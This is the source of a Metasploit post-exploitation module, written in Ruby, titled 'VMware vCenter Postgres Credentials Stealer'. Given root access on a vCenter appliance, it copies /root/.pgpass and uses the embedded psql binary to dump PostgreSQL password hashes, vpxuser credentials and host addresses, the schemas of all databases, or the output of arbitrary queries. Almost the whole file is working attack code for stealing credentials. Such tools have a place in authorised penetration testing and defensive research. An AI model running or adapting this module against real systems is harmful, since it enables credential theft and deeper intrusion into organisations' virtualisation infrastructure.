##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System

  def initialize(info={})
    super(
      'Name'         => "VMware vCenter Postgres Credentials Stealer for Linux",
      'Description'  => %q{
        This module gathers PostgreSQL passwords and hashes from VMware vCenter servers running on Linux.
      },
      'License'      => MSF_LICENSE,
      'Platform'     => ['linux'],
      'SessionTypes' => ['meterpreter','shell'],
      'Author'       => [
        'Erik Wynter', # @wyntererik
        ],
      'Actions' => [
        [ 'HASHDUMP', { 'Description' => 'Dump the PostgreSQL usernames and password hashes' } ],
        [ 'CUSTOM_QUERY', { 'Description' => 'Run a custom PostgreSQL query against the embedded database' } ],
        [ 'SCHEMADUMP', { 'Description' => 'Dump all database schemas (no data) using pg_dumpall' } ],
        [ 'VPXUSER_HASHDUMP', { 'Description' => 'Dump the password hashes for the vpxuser from the VCDB' } ],
      ],
      'DefaultAction' => 'HASHDUMP',
    )
    register_options [
      OptBool.new('DISPLAY_RESULTS', [false, 'Display the results to the screen in addition to storing them in the loot directory', true]),
      OptString.new('QUERY', [false, 'Query to run when using the "CUSTOM_QUERY" action.', 'SELECT version();']),
      OptString.new('QUERY_DB', [false, 'Name of the database to connect to when using the "CUSTOM_QUERY" action.', 'VCDB']),
      OptString.new('PSQL_PATH', [false, 'Path to the vpostgres psql binary', '']),
    ]
  end

  def pgpass
    '/root/.pgpass'
  end

  def display_results
    datastore['DISPLAY_RESULTS']
  end
    def query
    datastore['QUERY']
  end

  def query_db
    datastore['QUERY_DB']
  end

  def timeout
    datastore['TIMEOUT']
  end

  def psql_path
    datastore['PSQL_PATH']
  end

  def vpostgres_vmware_dir
    '/opt/vmware/vpostgres'
  end

  def load_file(fname)
    begin
      data = read_file(fname)
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error("Failed to retrieve file. #{e.message}")
      data = ''
    end
    data
  end

  def parse_pgpass(pgpass, db)
    pgpass.split("\n").each do |line|
      # example of pgpass line format: localhost:5432:VCDB:postgres:mypassword
      pghost, pgport, pgdb, pguser, pgpass = line.split(':')
      next if [pghost, pgport, pgdb, pguser, pgpass].any? {|i| i.blank?}
      # ignore the creds for the replication db since these can't be used
      next if pgdb == 'replication'
  
      # we want to save only one configuration per database, since by default they all work
      # we don't actually need the password since the server will read this from the .pgpass file
      if db == 'any'
        # by default the postgres and VCDB databases are configured with the same password for the 'postgres' user
        if pgdb == 'postgres' || pgdb == 'VCDB'
          return [pghost, pgport, pgdb, pguser]
        end
      else
        if db == pgdb
          return [pghost, pgport, pgdb, pguser]
        end
      end
    end
    [] # let's always return an array so we don't need to worry about the data type
  end

  def grab_bin
    unless psql_path.blank?
      unless file_exist?(psql_path)
        fail_with(Failure::NoTarget, "Cannot connect to the DB: The specified psql binary #{psql_path} does not exist")
      end
      return psql_path
    end

    unless directory?(vpostgres_vmware_dir)
      fail_with(Failure::NoTarget, "Cannot connect to the DB: Did not find a psql binary to use")
    end

    # check if /opt/vmware/vpostgres/current/bin/ exists, since this is where the most recent version of psql should be stored
    if file_exist?("#{vpostgres_vmware_dir}/current/bin/psql")
      return "#{vpostgres_vmware_dir}/current/bin/psql"
    end
    # check for specific vpostgres version directories, i.e.  /opt/vmware/vpostgres/9.6/bin/
    vpostgres_vmware_dir_ls = cmd_exec("ls #{vpostgres_vmware_dir}")
    if vpostgres_vmware_dir_ls.blank?
      fail_with(Failure::NoTarget, "Cannot connect to the DB: Did not find a psql binary to use")
    end

    # iteratre over the directories, and select the first that contains the binary we need, since the PostgreSQL version shouldn't matter
    vpostgres_vmware_dir_ls.split("\n").each do |d|
      bin_to_use = "#{vpostgres_vmware_dir}/#{d}/bin/psql"
      if file_exist?(bin_to_use)
        return bin_to_use
      end
    end

    fail_with(Failure::NoTarget, "Cannot connect to the DB: Did not find a psql binary to use")  
  end

  def dump_schema(bin_name, db_config)
    pghost, pgport, pgdb, pguser = db_config
    query_prefix = "export PGPASSFILE='/root/.pgpass'; #{bin_name} -h #{pghost} -p #{pgport} -U #{pguser} -w"
    pg_schema = []

    # list databases
    query_result = cmd_exec("#{query_prefix} -c 'SELECT datname FROM pg_database'")
    return if query_result == 1
    database_names = query_result.scan(/\n---+\n(.*?)\n\(\d+\srows/m)&.flatten&.first
    return if database_names.nil?

    database_names.split("\n").each do |database_name|
      database_name = database_name.strip
      tmp_db = {}
      tmp_db['DBName'] = database_name
      print_status("Enumerating database schema for: #{database_name}")
      tmp_db['Schemas'] = []
      query_prefix_db = "#{query_prefix} -d #{database_name}"

      # list schemas for the current database
      query_result = cmd_exec(%(#{query_prefix_db} -c 'SELECT nspname FROM pg_catalog.pg_namespace;'))
      next if query_result.blank? || query_result.include?('(0 rows)')
      tmp_schemanames = query_result.scan(/\n-+\n(.*?)\n\(\d+ rows\)/m)&.flatten&.first
      next if tmp_schemanames.blank?
      tmp_schemanames.split("\n").each do |schema_name|
        schema_name = schema_name.strip
        tmp_schema = {}
        tmp_schema['SchemaName'] = schema_name
        tmp_schema['Tables'] = []

        # list tables for the current schema
        query_result = cmd_exec(%(#{query_prefix_db} -c "SELECT table_name FROM information_schema.tables WHERE table_schema = '#{schema_name}'"))
        next if query_result.blank? || query_result.include?('(0 rows)')
        tmp_tblnames = query_result.scan(/\n-+\n(.*?)\n\(\d+ rows\)/m)&.flatten&.first
        next if tmp_tblnames.blank?
        tmp_tblnames.split("\n").each do |tblname|
          tmp_schema['Tables'] << tblname.strip
        end 
        tmp_db['Schemas'] << tmp_schema
      end
      pg_schema << tmp_db
    end

    if display_results
      print_status("Schemadump:\n#{pg_schema.to_yaml}")
    end
    path = store_loot('vcenter_dbschema', 'text/plain', session, pg_schema.to_yaml, 'vcenter_dbschema.yml')
    print_good("Saving schemadump in YAML format to #{path}")
  end

  def perform_action(bin_name, db_config, cmd)
    pghost, pgport, pgdb, pguser = db_config
    if action.name == 'SCHEMADUMP'
      return dump_schema(bin_name, db_config)
    end

    full_cmd = "export PGPASSFILE='/root/.pgpass'; #{bin_name} -h #{pghost} -p #{pgport} -d #{pgdb} -U #{pguser} -w -c '#{cmd}'" # this doesn't work without exporting pgpass
    print_status("Running command: #{full_cmd}")

    process_result(cmd_exec(full_cmd))
  end

  def process_result(query_result)
    if query_result.blank?
      fail_with(Failure::Unknown, "No data was obtained from the database.")
    end

    if query_result =~ /^ERROR:\s+/
      print_error("Received error message from the database:\n#{query_result}")
      return
    end

    if display_results
      print_status("Received query response:\n#{query_result}")
    end

    case action.name
    when 'CUSTOM_QUERY'
      loot_name = 'vcenter_query'
      message_name = 'query'
    when 'HASHDUMP'
      loot_name = 'vcenter_hashdump'
      message_name = 'hashdump'
    when 'VPXUSER_HASHDUMP'
      loot_name = 'vcenter_vpxdump'
      message_name = 'vpxuser hashdump'
    end
    path = store_loot(loot_name, 'text/plain', session, query_result, "#{loot_name}.txt")
    print_good("Saving #{message_name} result to #{path}")
  end

  def run
    unless is_root?
      fail_with(Failure::NoAccess, 'This module requires root privileges!')
    end

    unless sysinfo['OS'].include?('VMware Photon')
      fail_with(Failure::NoTarget, "Target is not a VMware vCenter Server.")
    end

    if action.name == 'CUSTOM_QUERY' && query.blank?
      fail_with(Failure::BadConfig, 'Please specify a query to run when using the "CUSTOM_QUERY" action.')
    end

    print_status("Trying to retrieve /root/.pgpass")
    unless file_exist?(pgpass)
      fail_with(Failure::NoTarget, "Cannot connect to the DB: #{pgpass} doesn't exist on target.")
    end

    pgpass_contents = load_file(pgpass)
    if pgpass_contents.blank?
      fail_with(Failure::NoTarget, "Cannot connect to the DB: #{pgpass} is empty or could not be read.")
    end

    # let's save this in any case, even if it doesn't contain the creds we are looking for
    path = store_loot('vcenter_pgpass', 'text/plain', session, pgpass_contents, 'vcenter_pgpass.txt')
    print_good("Saving #{pgpass} to #{path}")

    # identify the binary to use for connecting to the database
    # TODO: remove bin_name and just hardcode psql everywhere
    case action.name
    when 'HASHDUMP'
      cmd = 'SELECT usename, passwd FROM pg_shadow;'
      db = 'any'
    when 'CUSTOM_QUERY'
      cmd = query
      db = query_db
    when 'SCHEMADUMP'
      db = 'any'
    when 'VPXUSER_HASHDUMP'
      cmd = 'SELECT user_name, password, local_ip_address, dns_name from VPX_HOST;'
      db = 'VCDB'
    end

    # grab the configuratoins for the relevant database
    db_config = parse_pgpass(pgpass_contents, db)
    if db_config.empty?
      fail_with(Failure::NoTarget, "Cannot connect to the DB: #{pgpass} did not contain credentials that can be leveraged by this module.")
    end

    vprint_status("Locating the psql binary...")
    bin_to_use = grab_bin
    vprint_status("Found psql binary at #{bin_to_use}")

    perform_action(bin_to_use, db_config, cmd)
  end
end

